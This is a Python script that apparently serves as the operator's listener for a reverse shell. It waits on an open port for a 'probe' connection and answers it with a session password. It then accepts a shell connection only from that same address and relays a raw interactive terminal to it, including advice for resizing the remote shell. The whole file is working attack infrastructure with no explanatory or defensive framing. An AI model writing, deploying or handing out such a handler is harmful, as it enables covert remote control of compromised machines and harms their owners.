#!/usr/bin/env python3

import socket, sys, os, tty, termios, select, struct, fcntl, getpass

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4644
TIMEOUT = 40 

def get_term_size():
    s = struct.pack("HHHH", 0, 0, 0, 0)
    res = fcntl.ioctl(sys.stdout.fileno(), termios.TIOCGWINSZ, s)
    rows, cols, x, y = struct.unpack("HHHH", res)
    return rows, cols

def main():
    session_pass = getpass.getpass("Password: ")
    if session_pass:
        sys.stdout.write("\033[F\033[K")
        sys.stdout.flush()
    else:
        return

    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.settimeout(TIMEOUT)
    server.bind(('0.0.0.0', PORT))
    server.listen(128)

    shell_conn = None
    try:
        print(f"[*] Listening on {PORT}... (Timeout {TIMEOUT}s)")
        
        # 1. Capture the Probe
        probe_conn, addr = server.accept()
        authorized_ip = addr[0]
        
        # Display probe acknowledgement exactly as requested
        print(f"[*] Connection 1 (Probe) acknowledged from {authorized_ip}.")

        probe_conn.sendall(f"{session_pass}\n".encode())
        probe_conn.close() 

        server.settimeout(10)
        while True:
            shell_conn, addr = server.accept()
            if addr[0] == authorized_ip: 
                break
            else: 
                # Alert if a ping comes from a different address than the probe
                print(f"[!] Warning: Unauthorized ping from {addr[0]}. Dropping connection.")
                shell_conn.close()

        # 2. Display shell info exactly as requested
        rows, cols = get_term_size()
        print(f"[*] Shell established from {authorized_ip}")
        print(f"[*] Window size: {rows} rows, {cols} cols.")
        print(f"[*] Tip: Run 'stty rows {rows} cols {cols}' inside the shell.")

        tty.setraw(fd)
        while True:
            r, w, e = select.select([shell_conn, sys.stdin], [], [])
            if shell_conn in r:
                data = shell_conn.recv(8192)
                if not data: break 
                os.write(sys.stdout.fileno(), data)
            if sys.stdin in r:
                data = os.read(fd, 8192)
                if not data: break
                shell_conn.sendall(data)

    except (socket.timeout, TimeoutError):
        print("\n[!] Timeout reached: No response.")
    except Exception as e: 
        print(f"\n[!] Error: {e}")
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        if shell_conn: shell_conn.close()
        server.close()
        print("\n[+] Terminal restored.")

if __name__ == "__main__":
    main()
